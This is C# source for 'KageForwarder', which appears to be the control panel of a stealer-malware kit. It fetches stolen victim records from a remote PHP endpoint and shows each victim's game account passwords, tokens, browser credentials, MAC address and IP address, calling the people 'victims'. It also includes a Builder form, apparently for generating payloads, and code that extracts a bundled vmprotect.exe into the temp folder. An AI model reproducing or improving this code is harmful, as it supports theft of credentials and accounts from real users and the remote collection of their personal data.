using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Reflection;

namespace KageForwarder
{
    public partial class Form1 : Form
    {
        public static string text = @"";
        public string loluk = "";
        public Form1(string expiry)
        {
            InitializeComponent();
            loluk = expiry;
        }




        public string sad = "";
        public static string urls = "http://kageforwarder2.ml/trash/";
        public string codes = @"

";
        private void label1_Click(object sender, EventArgs e)
        {

        }
        public static void Extracts(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(Path.GetTempPath() + "\\vmprotect.exe"))
            {
              Extracts("KageForwarder", Path.GetTempPath(), "Resources", "vmprotect.exe");
            }
            RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
            label11.Text = "Account: " + " " + registryKey.OpenSubKey("trash\\lol").GetValue("ownr").ToString();
           
            expiry.Text = "Account expiry date: " + loluk;

           // AutoUpdater.Start(new WebClient().DownloadString(urls) + "/autupd.xml", null);
           // AutoUpdater.DownloadPath = Path.GetTempPath();
        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

       
        
        private void guna2Button2_Click(object sender, EventArgs e)
        {
            //WebClient web = new WebClient();
            string link = "https://discord.gg/5gRmNAbz2m";
            Process.Start(link);
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {

            Process.Start("https://www.youtube.com/channel/UCDZiRWxRJzJMl3JpM2i3y4w");
        }
        public string hardwareid()
        {
            string str = identifier("Win32_DiskDrive", "Model");
            string str2 = identifier("Win32_DiskDrive", "Manufacturer");
            string str4 = identifier("Win32_DiskDrive", "TotalHeads");
            string s = str + str2 + str4;
            string result;
            using (SHA1Managed sha1Managed = new SHA1Managed())
            {
                byte[] array = sha1Managed.ComputeHash(Encoding.UTF8.GetBytes(s));
                StringBuilder stringBuilder = new StringBuilder(array.Length * 2);
                foreach (byte b in array)
                {
                    stringBuilder.Append(b.ToString("X2"));
                }
                result = stringBuilder.ToString();
            }
            return result;
        }

        public string identifier(string wmiClass, string wmiProperty)
        {
            string text = "";
            foreach (ManagementBaseObject managementBaseObject in new ManagementClass(wmiClass).GetInstances())
            {
                ManagementObject managementObject = (ManagementObject)managementBaseObject;
                if (text == "")
                {
                    try
                    {
                        text = managementObject[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                    }
                }
            }
            return text;
        }
        public string requestData()
        {
            string result;
            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
            {
                string text = registryKey.OpenSubKey("trash\\lol").GetValue("ownr").ToString();
                string value = registryKey.OpenSubKey("trash\\lol").GetValue("aut").ToString();
                if (text != null)
                {
                    using (WebClient webClient = new WebClient())
                    {
                        NameValueCollection nameValueCollection = new NameValueCollection();
                        string value2 = hardwareid();
                        nameValueCollection["owner"] = text;
                        nameValueCollection["autid"] = value;
                        nameValueCollection["ident"] = value2;
                        byte[] bytes = webClient.UploadValues("http://kageforwarder2.ml/trash/" + "/get.php", nameValueCollection);
                        return Encoding.Default.GetString(bytes);
                    }
                }
                result = null;
            }
            return result;
        }
        public static string DecompressString(string compressedText)
        {
            byte[] array = Convert.FromBase64String(compressedText);
            string @string;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                int num = BitConverter.ToInt32(array, 0);
                memoryStream.Write(array, 4, array.Length - 4);
                byte[] array2 = new byte[num];
                memoryStream.Position = 0L;
                using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gzipStream.Read(array2, 0, array2.Length);
                }
                @string = Encoding.UTF8.GetString(array2);
            }
            return @string;
        }
        private List<DataPacket> parseData(string packet)
        {
            List<DataPacket> result;
            try
            {
                if (packet.Contains("You don't"))
                {
                    result = null;
                }
                else
                {
                    string[] array = packet.Split("^".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                    List<DataPacket> list = new List<DataPacket>();
                    foreach (string text in array)
                    {
                        try
                        {
                            DataPacket dataPacket = new DataPacket();
                            string[] array3 = text.Split("|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                            dataPacket.id = array3[0];
                            string s = Form1.DecompressString(array3[1]);
                            MemoryStream memoryStream = new MemoryStream(Encoding.Unicode.GetBytes(s));
                            Data data = (Data)new DataContractJsonSerializer(typeof(Data)).ReadObject(memoryStream);
                            dataPacket.reg = data.reg;
                            dataPacket.lastlogin = data.lastlogin;
                            dataPacket.cognito = data.cognito;
                            dataPacket.gid = data.gid;
                            dataPacket.passwords = data.passwords;
                            dataPacket.lastworld = data.lastworld;
                            dataPacket.user = data.user;
                            dataPacket.MAC = data.MAC;
                            dataPacket.volid = data.volid;
                            try
                            {
                                dataPacket.token = data.token;
                            }
                            catch
                            {
                                dataPacket.token = null;
                            }

                            memoryStream.Close();
                            dataPacket.browser = Form1.DecompressString(array3[2]);
                            string text2 = Form1.DecompressString(array3[3]);
                            char[] separator = new char[]
                            {
                                '|'
                            };
                            string[] array4 = text2.Split(separator, StringSplitOptions.RemoveEmptyEntries);
                            if (array4.Length == 3)
                            {
                                dataPacket.bit = array4[0];
                                dataPacket.resolution = array4[1];
                                dataPacket.os = array4[2];
                            }
                            else
                            {
                                dataPacket.bit = "disabled";
                                dataPacket.resolution = "disabled";
                                dataPacket.os = "disabled";
                            }
                            dataPacket.ip = array3[4];
                            dataPacket.date = array3[5];
                            list.Add(dataPacket);
                        }
                        catch
                        {
                        }
                    }
                    result = list;
                }
            }
            catch
            {
                MessageBox.Show("Failed to parse data.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                result = null;
            }
            return result;
        }

        
        

        

       

        private void label1_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Form1.ActiveForm.WindowState = FormWindowState.Minimized;
        }

       

        private void button1_Click(object sender, EventArgs e)
        {
            if (bunifuCustomDataGrid1.CurrentRow != null)
            {
                using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
                {
                    string text = registryKey.OpenSubKey("trash\\lol").GetValue("ownr").ToString();
                    if (text != null)
                    {
                        using (WebClient webClient = new WebClient())
                        {
                            
                            NameValueCollection nameValueCollection = new NameValueCollection();
                            nameValueCollection["owner"] = text;
                            nameValueCollection["id"] = bunifuCustomDataGrid1.CurrentRow.Cells["ID"].Value.ToString();
                            byte[] bytes = webClient.UploadValues(urls + "/memes.php", nameValueCollection);
                            if (Encoding.Default.GetString(bytes).Contains("success"))
                            {
                                bunifuCustomDataGrid1.Rows.RemoveAt(bunifuCustomDataGrid1.CurrentRow.Index);
                                counted.Text = bunifuCustomDataGrid1.RowCount.ToString();
                            }
                            else
                            {
                                MessageBox.Show("Unknown error");
                            }
                        }
                    }
                    return;
                }
            }
            MessageBox.Show("You didn't even choose an account!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        

       

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            Builder f2 = new Builder();
            f2.Show();
        }

        private void viewCredentialsToolStripMenuItem_Click(object sender, EventArgs e)
        {
 
                try
                {
                    if (bunifuCustomDataGrid1.CurrentRow.Cells["Browser"].Value != null)
                    {
                       
                            string text = bunifuCustomDataGrid1.CurrentRow.Cells["Browser"].Value.ToString();
                            string xd = DecompressString(text);

                            char[] separator = new char[]
                            {
                            '^'
                            };
                            string[] array = xd.Split(separator, StringSplitOptions.RemoveEmptyEntries);
                            List<Credentials.Browserz> list = new List<Credentials.Browserz>();
                            foreach (string s in array)
                            {

                                XmlObjectSerializer xmlObjectSerializer = new DataContractJsonSerializer(typeof(Credentials.Browserz));
                                MemoryStream memoryStream = new MemoryStream(Encoding.Unicode.GetBytes(s));
                                Credentials.Browserz item = (Credentials.Browserz)xmlObjectSerializer.ReadObject(memoryStream);
                                memoryStream.Position = 0L;
                                new StreamReader(memoryStream).ReadToEnd();
                                memoryStream.Close();
                                list.Add(item);

                            }
                            new Credentials(list).ShowDialog();
                    }
                }
                catch (NullReferenceException)
                {
                    MessageBox.Show("You didn't even choose an account!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
                catch
                {

                    MessageBox.Show("decrypting passwords has failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
        }

        private void extraInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
                try
                {
                    DataGridViewRow currentRow = bunifuCustomDataGrid1.CurrentRow;
                    string Bit;
                    if (currentRow.Cells["Bit"].Value != null)
                    {
                        Bit = currentRow.Cells["Bit"].Value.ToString();
                    }
                    else
                    {
                        Bit = "";
                    }
                    string ipz;
                    if (currentRow.Cells["IP"].Value != null)
                    {
                        ipz = currentRow.Cells["IP"].Value.ToString();
                    }
                    else
                    {
                        ipz = "";
                    }
                    string resolution;
                    if (currentRow.Cells["Resolution"].Value != null)
                    {
                        resolution = currentRow.Cells["Resolution"].Value.ToString();
                    }
                    else
                    {
                        resolution = "";
                    }
                    string token;
                    if (currentRow.Cells["token"].Value != null)
                    {
                        token = currentRow.Cells["token"].Value.ToString();
                    }
                    else
                    {
                        token = "";
                    }
                    string Os;
                    if (currentRow.Cells["Os"].Value != null)
                    {
                        Os = currentRow.Cells["Os"].Value.ToString();
                    }
                    else
                    {
                        Os = "";
                    }
                    string user;
                    if (currentRow.Cells["Volume"].Value != null)
                    {
                        user = currentRow.Cells["Volume"].Value.ToString();
                    }
                    else
                    {
                        user = "";
                    }
                    new Information(Bit, ipz, resolution, token, Os, user).ShowDialog();
                }
                catch (NullReferenceException)
                {
                    MessageBox.Show("You didn't even choose a victim!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
                catch (Exception)
                {
                    MessageBox.Show("Unknown error occured.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
        }

        private void pullDataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                bunifuCustomDataGrid1.Rows.Clear();
                string packet = requestData();
                List<DataPacket> list = parseData(packet);
                if (list == null)
                {
                    Console.WriteLine("null");
                }
                else
                {
                    try
                    {
                        for (int i = 0; i < list.Count; i++)
                        {
                            bunifuCustomDataGrid1.Rows.Add();
                            bunifuCustomDataGrid1.Rows[i].Cells["GrowID"].Value = list[i].gid;
                            bunifuCustomDataGrid1.Rows[i].Cells["Passwords"].Value = list[i].passwords;
                            bunifuCustomDataGrid1.Rows[i].Cells["Lastworld"].Value = list[i].lastworld;
                            bunifuCustomDataGrid1.Rows[i].Cells["ID"].Value = list[i].id;
                            bunifuCustomDataGrid1.Rows[i].Cells["MAC"].Value = list[i].MAC;
                            bunifuCustomDataGrid1.Rows[i].Cells["Bit"].Value = list[i].bit;
                            bunifuCustomDataGrid1.Rows[i].Cells["User"].Value = list[i].user;
                            bunifuCustomDataGrid1.Rows[i].Cells["Volume"].Value = list[i].volid;
                            bunifuCustomDataGrid1.Rows[i].Cells["IP"].Value = list[i].ip;
                            bunifuCustomDataGrid1.Rows[i].Cells["Date"].Value = list[i].date;
                            bunifuCustomDataGrid1.Rows[i].Cells["Browser"].Value = list[i].browser;
                            bunifuCustomDataGrid1.Rows[i].Cells["Resolution"].Value = list[i].resolution;
                            bunifuCustomDataGrid1.Rows[i].Cells["Os"].Value = list[i].os;
                            bunifuCustomDataGrid1.Rows[i].Cells["token"].Value = list[i].token;
                            bunifuCustomDataGrid1.Rows[i].Cells["lastlogin"].Value = list[i].lastlogin;
                            bunifuCustomDataGrid1.Rows[i].Cells["cognito"].Value = list[i].cognito;
                            bunifuCustomDataGrid1.Rows[i].Cells["reg"].Value = list[i].reg;

                            bunifuCustomDataGrid1.Rows[i].DefaultCellStyle.BackColor = Color.FromArgb(42, 51, 60);

                            counted.Text = list.Count.ToString();

                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }
            catch (Exception)
            {
                MessageBox.Show("You don't have any accounts or data parsing failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private void growtopiaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                DataGridViewRow currentRow = bunifuCustomDataGrid1.CurrentRow;

                string user;
                if (currentRow.Cells["User"].Value != null)
                {
                    user = currentRow.Cells["User"].Value.ToString();
                }
                else
                {
                    user = "";
                }
                string password;
                if (currentRow.Cells["Passwords"].Value != null)
                {
                    password = currentRow.Cells["Passwords"].Value.ToString();
                }
                else
                {
                    password = "*";
                }
                string lastworld;
                if (currentRow.Cells["Lastworld"].Value != null)
                {
                    lastworld = currentRow.Cells["lastworld"].Value.ToString();
                }
                else
                {
                    lastworld = "*";
                }
                string growid;
                if (currentRow.Cells["GrowID"].Value != null)
                {
                    growid = currentRow.Cells["GrowID"].Value.ToString();
                }
                else
                {
                    growid = "*";
                }
                string mac;
                if (currentRow.Cells["MAC"].Value != null)
                {
                    mac = currentRow.Cells["MAC"].Value.ToString();
                }
                else
                {
                    mac = "";
                }
                string reg;
                if (currentRow.Cells["reg"].Value != null)
                {
                    reg = currentRow.Cells["reg"].Value.ToString();
                }
                else
                {
                    reg = "";
                }
                new Growtopia(user, growid, password, lastworld, mac, reg).ShowDialog();
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("You didn't even choose a victim!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            catch (Exception)
            {
                MessageBox.Show("Unknown error occured.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }
       
     

        private void iTalk_TabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void pixelWorldAccountToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                DataGridViewRow currentRow = bunifuCustomDataGrid1.CurrentRow;

                string user;
                if (currentRow.Cells["User"].Value != null)
                {
                    user = currentRow.Cells["User"].Value.ToString();
                }
                else
                {
                    user = "";
                }
                string lastlogin;
                if (currentRow.Cells["lastlogin"].Value != null)
                {
                    lastlogin = currentRow.Cells["lastlogin"].Value.ToString();
                }
                else
                {
                    lastlogin = "*";
                }
                string cognito;
                if (currentRow.Cells["cognito"].Value != null)
                {
                    cognito = currentRow.Cells["cognito"].Value.ToString();
                }
                else
                {
                    cognito = "*";
                }
                new pixelworld(user, cognito, lastlogin).ShowDialog();
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("You didn't even choose a victim!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            catch (Exception)
            {
                MessageBox.Show("Unknown error occured.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
           
        }
    }
}
